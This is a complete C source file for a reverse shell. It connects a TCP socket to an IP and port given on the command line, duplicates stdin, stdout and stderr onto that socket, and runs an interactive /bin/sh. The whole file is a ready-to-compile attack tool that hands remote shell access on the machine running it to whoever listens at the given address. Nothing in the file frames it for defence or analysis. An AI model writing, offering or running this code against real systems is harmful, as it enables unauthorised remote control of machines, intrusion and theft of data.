#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
 
int main (int argc, char **argv)
{
  if(argc != 3){ // make sure correct number of arguments are being passed
	printf("Usage revshell <ip> <port>\n");
  }
  
  else{
  	char* ip = argv[1]; // the 0th arg will be the command, so the ip will be the 1st argument
	int port = atoi(argv[2]); // 2nd argument is the port
  
  	int scktd;
  	struct sockaddr_in client;
 
  	client.sin_family = AF_INET;
  	client.sin_addr.s_addr = inet_addr(ip);
  	client.sin_port = htons(port);

  	scktd = socket(AF_INET,SOCK_STREAM,0);
  	connect(scktd,(struct sockaddr *)&client,sizeof(client));

  	dup2(scktd,0); // STDIN
  	dup2(scktd,1); // STDOUT
  	dup2(scktd,2); // STDERR

  	execl("/bin/sh","sh","-i",NULL,NULL);
  }

  return 0;
}
